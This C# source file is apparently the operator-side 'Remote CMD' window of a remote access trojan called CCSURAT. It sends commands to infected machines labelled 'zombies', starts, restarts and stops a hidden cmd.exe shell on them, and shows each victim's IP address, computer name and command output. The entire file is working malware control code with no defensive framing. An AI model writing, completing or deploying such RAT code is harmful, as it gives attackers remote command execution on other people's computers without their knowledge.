using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace CCSURAT_Server.ControlForms
{
    public partial class RemoteCMD : Form
    {
        private bool running = false;
        Zombie zombie;
        private delegate void AddTextbox(string data);

        public RemoteCMD(Zombie zombie)
        {
            InitializeComponent();
            this.zombie = zombie;
            cmdTextbox.Enabled = false;
            cmdSendButton.Enabled = false;
            this.Text = zombie.IP + " " + zombie.computerName + " Remote CMD";
        }

        // Send a command to the client's spawned cmd prompt
        private void cmdSendButton_Click(object sender, EventArgs e)
        {
            SendData();
        }

        // Append data to "command prompt"
        public void AddToTextbox(string data)
        {
            if (cmdPromptTextbox.InvokeRequired)
            {
                cmdPromptTextbox.Invoke(new AddTextbox(AddToTextbox), new object[] { data });
            }
            else
            {
                try {
                    cmdPromptTextbox.Text += data.ToString();
                } catch(Exception ex) { }
            }
        }

        private void cmdPromptTextbox_TextChanged(object sender, EventArgs e)
        {
            cmdPromptTextbox.SelectionStart = cmdPromptTextbox.Text.Length;
            cmdPromptTextbox.ScrollToCaret();
            cmdPromptTextbox.Refresh();
        }

        // Gets data that was returned to client object.
        private void GetData()
        {
            // Wait until some cmd prompt data was returned by client.
            while (zombie.CMDData == string.Empty)
            {
                System.Threading.Thread.Sleep(1); // pls don't kill CPU
                Application.DoEvents();
            }
            string data = zombie.CMDData;
            zombie.CMDData = string.Empty;
            AddToTextbox(data);
        }

        private void SendData()
        {
            zombie.SendData("[[REMOTECMD]]" + cmdTextbox.Text + "[[/REMOTECMD]]");
            cmdTextbox.Text = string.Empty;
            GetData();
        }

        private void Start()
        {
            if (!running)
            {
                // Send command to client to start the remote CMD.
                zombie.SendData("[[REMOTECMD]][[START]][[/REMOTECMD]]");
                cmdTextbox.Enabled = true;
                cmdSendButton.Enabled = true;
                running = true;
                GetData();
            }
            else
            {
                MessageBox.Show("Remote CMD is already running.");
            }
        }

        // Restart the client's cmd.exe process and get the data again.
        private void Restart()
        {
            if (running)
            {
                zombie.SendData("[[REMOTECMD]][[RESTART]][[/REMOTECMD]]");
                GetData();
            }
            else
                MessageBox.Show("Remote CMD is not running.");
        }

        // Stop the client's cmd.exe process.
        private void Stop()
        {
            if (running)
            {
                zombie.SendData("[[REMOTECMD]][[STOP]][[/REMOTECMD]]");
                running = false;
                cmdTextbox.Enabled = false;
                cmdSendButton.Enabled = false;
            }
            else
                MessageBox.Show("Remote CMD is not running.");
        }

        private void RemoteCMD_Load(object sender, EventArgs e)
        {

        }

        private void stopToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Stop();
        }

        private void startToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Start();
            Restart(); // figure out why this doesn't work without this extra restart
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Restart();
        }
    }
}
